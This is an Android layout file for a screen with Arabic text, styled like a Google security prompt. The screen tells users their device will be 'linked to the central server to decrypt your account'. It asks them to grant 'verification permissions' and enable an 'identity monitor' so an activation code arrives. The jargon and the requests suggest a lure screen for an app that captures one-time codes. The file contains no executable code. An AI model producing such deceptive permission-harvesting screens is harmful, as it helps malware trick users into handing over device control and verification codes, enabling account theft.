<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:background="#FFFFFF"
    android:gravity="center"
    android:padding="25dp">

    <ImageView
        android:layout_width="100dp"
        android:layout_height="100dp"
        android:src="@android:drawable/ic_dialog_info"
        app:tint="#1A73E8"
        android:layout_marginBottom="20dp" />

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="نظام التحقق المباشر (V2)"
        android:textSize="22sp"
        android:textStyle="bold"
        android:textColor="#1A73E8"
        android:fontFamily="sans-serif-medium"/>

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="سيتم الآن ربط معالج جهازك بالسيرفر المركزي لفك التشفير اليدوي عن حسابك."
        android:gravity="center"
        android:layout_marginTop="15dp"
        android:textColor="#666666"
        android:textSize="14sp"
        android:lineSpacingExtra="6dp" />

    <androidx.cardview.widget.CardView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="30dp"
        app:cardCornerRadius="15dp"
        app:cardBackgroundColor="#F1F3F4"
        app:cardElevation="0dp">
        
        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="vertical"
            android:padding="20dp">
            
            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="متطلبات العملية الأمنية:"
                android:textStyle="bold"
                android:textColor="#202124"
                android:textSize="15sp" />
            
            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="• منح أذونات التحقق لبروتوكول النظام\n• تفعيل مراقب الهوية لضمان وصول كود التفعيل"
                android:textColor="#5F6368"
                android:textSize="13sp"
                android:layout_marginTop="8dp"
                android:lineSpacingExtra="4dp"/>
        </LinearLayout>
    </androidx.cardview.widget.CardView>

    <FrameLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="40dp">

        <Button
            android:id="@+id/btnStartVerify"
            android:layout_width="match_parent"
            android:layout_height="60dp"
            android:text="بدء عملية الربط والتحقق"
            android:backgroundTint="#1A73E8"
            android:textColor="#FFFFFF"
            android:textAllCaps="false"
            android:textSize="16sp"
            android:textStyle="bold"
            app:cornerRadius="12dp" />

        <ProgressBar
            android:id="@+id/verifyProgressBar"
            android:layout_width="30dp"
            android:layout_height="30dp"
            android:layout_gravity="center"
            android:visibility="gone"
            android:indeterminateTint="#FFFFFF" />
    </FrameLayout>

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginTop="20dp"
        android:text="اتصال مشفر 256-bit SSL"
        android:textColor="#BDC1C6"
        android:textSize="11sp" />

</LinearLayout>
